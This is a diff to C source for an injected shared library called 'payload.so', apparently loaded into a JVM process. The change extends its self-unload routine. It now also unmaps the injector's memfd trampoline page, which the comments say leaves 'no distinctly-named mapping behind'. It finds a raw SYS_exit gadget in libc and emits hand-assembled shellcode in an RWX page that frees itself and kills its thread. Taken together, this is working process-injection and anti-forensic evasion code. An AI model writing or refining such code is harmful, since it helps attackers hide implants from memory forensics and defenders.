@@ -14,6 +14,7 @@
 #include <stdint.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <dlfcn.h>
 #include <sys/mman.h>
 
 static void schedule_self_unload(void);
@@ -114,13 +115,56 @@ struct map_region {
     unsigned long len;
 };
 
+/*
+ * Locate a "mov eax, 60; syscall" sequence (raw SYS_exit) inside libc's own
+ * executable mapping and return its live address, or 0 if not found.
+ *
+ * The self-unload thread uses this to end itself from code that outlives its
+ * trampoline page: it munmaps the page via libc's munmap, whose return lands
+ * here, and this gadget makes the exit syscall. SYS_exit terminates just this
+ * (non-JVM) thread with no unwinding and no glibc teardown, so it never walks
+ * back through the freed page the way pthread_exit would. We scan libc's live
+ * r-x region rather than the on-disk file so the address is already relocated.
+ */
+static unsigned long find_libc_exit_gadget(void) {
+    static const unsigned char pattern[] = {0xB8, 0x3C, 0x00, 0x00, 0x00, 0x0F, 0x05};
+
+    FILE *maps = fopen("/proc/self/maps", "r");
+    if (!maps) return 0;
+
+    unsigned long found = 0;
+    char line[512];
+    while (fgets(line, sizeof(line), maps)) {
+        if (!strstr(line, "r-xp")) continue;
+        if (!strstr(line, "/libc") && !strstr(line, "libc.so")) continue;
+
+        unsigned long start, end;
+        if (sscanf(line, "%lx-%lx", &start, &end) != 2) continue;
+
+        void *hit = memmem((void *)start, end - start, pattern, sizeof(pattern));
+        if (hit) {
+            found = (unsigned long)hit;
+            break;
+        }
+    }
+    fclose(maps);
+    return found;
+}
+
 static void schedule_self_unload(void) {
     /*
-     * Collect all payload.so mappings from /proc/self/maps so we can
-     * munmap them directly.  This bypasses dlclose entirely, avoiding
-     * the SIGSEGV in _dl_catch_exception that glibc triggers when
-     * dlclose walks TLS / link_map structures from a thread that was
-     * created while the library was loaded.
+     * Collect the mappings to erase from /proc/self/maps and munmap them
+     * directly. This bypasses dlclose entirely, avoiding the SIGSEGV in
+     * _dl_catch_exception that glibc triggers when dlclose walks TLS /
+     * link_map structures from a thread created while the library was loaded.
+     *
+     * Two kinds of region go in the table:
+     *   - payload.so's own segments
+     *   - the injector's trampoline page, which shows up as "memfd:x" (the
+     *     injector names its memfd "x"). It carried the pthread_create
+     *     shellcode during injection and has been idle ever since, so nothing
+     *     executes on it and it is safe to drop from here. Removing it leaves
+     *     no distinctly-named mapping behind.
      */
     struct map_region regions[16];
     int num_regions = 0;
@@ -133,26 +177,28 @@ static void schedule_self_unload(void) {
 
     char line[512];
     while (fgets(line, sizeof(line), maps) && num_regions < 16) {
-        if (!strstr(line, "payload")) continue;
-        if (!strstr(line, ".so")) continue;
+        int is_payload = strstr(line, "payload") && strstr(line, ".so");
+        int is_trampoline = strstr(line, "memfd:x") != NULL;
+        if (!is_payload && !is_trampoline) continue;
 
         unsigned long start, end;
         if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
             regions[num_regions].addr = start;
             regions[num_regions].len  = end - start;
-            printf("[payload] Region %d: 0x%lx - 0x%lx (%lu bytes)\n",
-                   num_regions, start, end, end - start);
+            printf("[payload] Region %d: 0x%lx - 0x%lx (%lu bytes) %s\n",
+                   num_regions, start, end, end - start,
+                   is_trampoline ? "[injector trampoline]" : "[payload.so]");
             num_regions++;
         }
     }
     fclose(maps);
 
     if (num_regions == 0) {
-        fprintf(stderr, "[payload] No payload.so mappings found\n");
+        fprintf(stderr, "[payload] No mappings found to unmap\n");
         return;
     }
 
-    printf("[payload] Found %d payload.so region(s) to munmap\n", num_regions);
+    printf("[payload] Found %d region(s) to munmap\n", num_regions);
 
     /*
      * Allocate an anonymous RWX page for the trampoline.
@@ -176,7 +222,7 @@ static void schedule_self_unload(void) {
      *   ; nanosleep({0, 200000000}, NULL) - wait 200ms for threads to exit
      *   ; loop over region table at (page + 0x200):
      *   ;   munmap(region.addr, region.len)   ; SYS_munmap = 11
-     *   ; return NULL
+     *   ; then free this page too and exit the thread (see tail below)
      *
      * Register usage:
      *   r12 = pointer to current region entry
@@ -272,15 +318,58 @@ static void schedule_self_unload(void) {
     /* loop_done: patch the jz offset */
     page[jz_patch] = (unsigned char)(off - (jz_patch + 1));
 
-    /* pop callee-saved */
-    page[off++] = 0x41; page[off++] = 0x5E;  /* pop r14 */
-    page[off++] = 0x41; page[off++] = 0x5D;  /* pop r13 */
-    page[off++] = 0x41; page[off++] = 0x5C;  /* pop r12 */
+    /*
+     * Final step: free this trampoline page too, leaving nothing of ours
+     * mapped. A thread can't munmap the page it is executing on and then run
+     * another instruction from it, so the munmap and the thread-exit both run
+     * from libc, which is always mapped:
+     *
+     *   rdi = page; rsi = 4096; align rsp
+     *   push exit_gadget            ; return address for munmap
+     *   jmp  munmap                 ; frees this page from inside libc, then
+     *                               ; rets into "mov eax,60; syscall" -> exit
+     *
+     * No instruction is ever fetched from the page after munmap frees it, and
+     * SYS_exit ends this (unattached, non-JVM) thread without the stack
+     * unwinding that made pthread_exit crash in _dl_catch_exception.
+     */
+    unsigned long munmap_addr = (unsigned long)dlsym(RTLD_DEFAULT, "munmap");
+    unsigned long exit_gadget = find_libc_exit_gadget();
 
-    /* xor eax, eax ; return NULL */
-    page[off++] = 0x31; page[off++] = 0xC0;
-    /* ret */
-    page[off++] = 0xC3;
+    if (munmap_addr && exit_gadget) {
+        unsigned long page_addr = (unsigned long)page;
+
+        /* movabs rdi, page_addr   ; munmap arg1 */
+        page[off++] = 0x48; page[off++] = 0xBF;
+        memcpy(&page[off], &page_addr, 8); off += 8;
+
+        /* mov esi, 4096           ; munmap arg2 */
+        page[off++] = 0xBE;
+        uint32_t plen = 4096;
+        memcpy(&page[off], &plen, 4); off += 4;
+
+        /* and rsp, -16            ; 16-byte align for the libc call */
+        page[off++] = 0x48; page[off++] = 0x83; page[off++] = 0xE4; page[off++] = 0xF0;
+
+        /* movabs rax, exit_gadget ; push rax  (munmap returns into it) */
+        page[off++] = 0x48; page[off++] = 0xB8;
+        memcpy(&page[off], &exit_gadget, 8); off += 8;
+        page[off++] = 0x50;
+
+        /* movabs rax, munmap ; jmp rax */
+        page[off++] = 0x48; page[off++] = 0xB8;
+        memcpy(&page[off], &munmap_addr, 8); off += 8;
+        page[off++] = 0xFF; page[off++] = 0xE0;
+    } else {
+        /* Couldn't resolve the libc entry points: wind the thread down
+         * normally and leave this one anonymous page mapped rather than risk
+         * jumping somewhere bad. */
+        page[off++] = 0x41; page[off++] = 0x5E;  /* pop r14 */
+        page[off++] = 0x41; page[off++] = 0x5D;  /* pop r13 */
+        page[off++] = 0x41; page[off++] = 0x5C;  /* pop r12 */
+        page[off++] = 0x31; page[off++] = 0xC0;  /* xor eax, eax */
+        page[off++] = 0xC3;                      /* ret */
+    }
 
     printf("[payload] Trampoline built: %d bytes of shellcode\n", off);
 
